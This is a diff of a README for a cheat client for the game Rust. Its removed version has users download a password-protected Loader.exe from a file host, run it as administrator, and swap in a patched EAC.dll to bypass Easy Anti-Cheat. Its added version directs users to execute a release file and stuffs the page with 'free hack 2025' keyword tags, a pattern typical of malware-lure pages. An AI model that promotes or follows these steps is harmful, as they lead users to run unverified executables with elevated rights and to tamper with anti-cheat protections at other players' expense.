@@ -1,101 +1,99 @@
-# 🧩 Enigma for Rust 2025
+# ENIGMA-RUST-2025 🎮🔐
 
----
+Welcome to the **ENIGMA-RUST-2025** repository! This project offers a multifunctional private cheat for Rust, designed for players who seek to enhance their gameplay experience. With a focus on secrecy and flexible configuration, Enigma allows you to maintain control in any environment. 
 
-## 🎯 Overview
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/anhlie/ENIGMA-RUST-2025/releases)
 
-**Enigma** is a conceptual private multi-functional cheat client for **Rust**. It showcases the type of features commonly found in high-end, undetected game cheats. Designed with modularity, stealth, and user customization in mind, Enigma simulates what a top-tier cheat might include.
+## Table of Contents
 
----
+1. [Features](#features)
+2. [Installation](#installation)
+3. [Usage](#usage)
+4. [Configuration](#configuration)
+5. [Topics](#topics)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Support](#support)
 
-<p align="center">
-  <img src="https://i.imgur.com/Y1ZgPM7.jpeg" alt="Screenshot 1" width="22%" style="margin-right: 10px;">
-  <img src="https://i.imgur.com/1eWHlCG.png" alt="Screenshot 2" width="22%" style="margin-right: 10px;">
-  <img src="https://i.imgur.com/tSrjEwJ.png" alt="Screenshot 3" width="22%" style="margin-right: 10px;">
-  <img src="https://i.imgur.com/WacOZtB.png" alt="Screenshot 4" width="22%">
-</p>
+## Features
 
----
+- **High Functionality**: Enigma combines various cheat functions to give you an edge in gameplay.
+- **Secrecy**: Designed with privacy in mind, ensuring your gameplay remains discreet.
+- **Flexible Configuration**: Customize settings to fit your style and needs.
+- **User-Friendly Interface**: Easy to navigate and set up, even for beginners.
 
-## 💾 Installation
+## Installation
 
-> ❗ **Important:**  
-> The following installation instructions simulate how a cheat like *Enigma* might be injected or loaded into Rust.  
+To get started, download the latest release from our [Releases section](https://github.com/anhlie/ENIGMA-RUST-2025/releases). Make sure to execute the downloaded file according to the instructions provided in the release notes.
 
-### 🧭 Step-by-step
+1. Visit the [Releases section](https://github.com/anhlie/ENIGMA-RUST-2025/releases).
+2. Choose the latest version.
+3. Download the file.
+4. Execute the file following the provided instructions.
 
-1. **Download the loader**  
-   [Download](https://www.4sync.com/web/directDownload/Lh-numdh/cKQ38aak.59488ffcf9e28923ee42c908e3a6290e) and place `Loader.exe` in any folder **outside** of the Rust directory. **Password ENIGMA**
+## Usage
 
-2. **Run the loader**  
-   Launch `Loader.exe` as administrator. 
+Once installed, you can start using Enigma to enhance your Rust gameplay. Here’s a quick guide on how to get started:
 
-3. **Patch Easy Anti-Cheat**  
-   Locate the Rust game directory (e.g., `C:\Program Files (x86)\Steam\steamapps\common\Rust`)  
-   Replace the existing `EAC.dll` file with the modified one provided (`EAC.dll` → patched version).  
-   > ⚠️ *This bypasses the anti-cheat initialization.*
+1. Launch the cheat application.
+2. Configure your desired settings through the user interface.
+3. Start Rust and enjoy the enhanced features.
 
-4. **Launch the game**  
-   Start Rust normally through Steam or the loader. The cheat interface should appear in-game.
+## Configuration
 
----
+Enigma allows for extensive customization. Here are some key settings you can adjust:
 
-## 🧠 Features
+- **Aimbot**: Fine-tune your aim settings for better accuracy.
+- **ESP**: Enable or disable various ESP features to see enemies and items through walls.
+- **Chams**: Adjust the visibility of players and objects.
+- **Fly Hack**: Set up flying capabilities for exploration.
+- **Freecam**: Navigate the game world freely without being affected by game physics.
 
-### 👁️ Aimbot
-- `Silent Aim` – Fire without visible aim movement.
-- `Smooth Aim` – Human-like targeting transition.
-- `Bone Selection` – Choose target areas (head, chest, etc.).
-- `FOV Control` – Field of view limitation.
-- `Movement Prediction` – Predicts enemy motion for better accuracy.
+For detailed configuration options, refer to the documentation included in the release package.
 
-### 🔍 ESP (Wallhack)
-- `Player ESP` – Show players through walls.
-- `Item ESP` – Highlight lootable items, weapons, etc.
-- `Trap / TC ESP` – Display turrets, traps, tool cupboards.
-- `Distance Info` – Show distance to any ESP object.
-- `Skeleton ESP` – Outline enemy skeletons.
+## Topics
 
-### 🛠️ Miscellaneous
-- `No Recoil / No Spread` – Eliminate weapon recoil and bullet spread.
-- `Instant Eoka` – Remove Eoka ignition delay.
-- `Fast Loot / Auto Loot` – Accelerate item pickup speed.
-- `Spider Climb` – Climb vertical walls.
-- `Speed Hack` – Increased movement speed.
-- `Fly Hack / Air Jump` – Fly or double jump.
-- `Time Changer` – Modify time of day locally.
-- `Debug Camera` – Free cam movement.
-- `Admin Flag Spoof` – Spoof admin permissions.
+This repository covers a range of topics related to Rust gameplay enhancements. Here are some of the main topics you will find:
 
-### 🔐 Security & Bypass
-- `Kernel-Level Injection` – Operates at low system level for stealth.
-- `HWID Spoofer` – Bypass hardware bans.
-- `Auto Updater` – Syncs with game patches automatically.
-- `Undetected Builds` – Simulated evasion from anti-cheat systems like EAC.
+- **free-ai-aimbot-2025**
+- **free-aim-rust**
+- **free-cheats-for-rust-2025**
+- **free-hack-for-rust-2025**
+- **free-wh-rust**
+- **rust**
+- **rust-2025**
+- **rust-chams**
+- **rust-cheat-github**
+- **rust-config**
+- **rust-enigma**
+- **rust-esp**
+- **rust-esp-github**
+- **rust-external**
+- **rust-fly-hack**
+- **rust-freecam-2025**
+- **rust-game-esp**
+- **rust-hack-2025**
+- **rust-hack-github**
+- **rust-visual**
 
----
+## Contributing
 
-<p align="center">
-  <img src="https://i.imgur.com/wVeAa0w.png" alt="Screenshot 5" width="45%" style="margin-right: 10px;">
-  <img src="https://i.imgur.com/osy9sCK.png" alt="Screenshot 6" width="45%">
-</p>
+We welcome contributions to improve the ENIGMA-RUST-2025 project. If you have suggestions or enhancements, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or fix.
+3. Commit your changes.
+4. Push to your branch.
+5. Open a pull request.
 
-## 🛠 UI and Usability
+Please ensure that your contributions align with the project's goals and adhere to our coding standards.
 
-- Clean in-game menu interface.
-- Fully configurable aimbot and ESP via sliders/toggles.
-- Save and load custom profiles.
-- Stream-safe overlay (invisible on OBS/recording software).
+## License
 
----
+This project is licensed under the MIT License. For more details, please check the LICENSE file in the repository.
 
-## ✅ Key Benefits
-- Simulated undetectable behavior.
-- Advanced bypass mechanisms.
-- Developer-friendly modular design.
-- Updated to reflect changes in Rust engine and anti-cheat.
+## Support
 
----
+If you encounter issues or have questions, feel free to open an issue in the repository. You can also check the [Releases section](https://github.com/anhlie/ENIGMA-RUST-2025/releases) for updates and troubleshooting tips.
 
+Thank you for your interest in ENIGMA-RUST-2025! Enjoy your enhanced Rust experience!
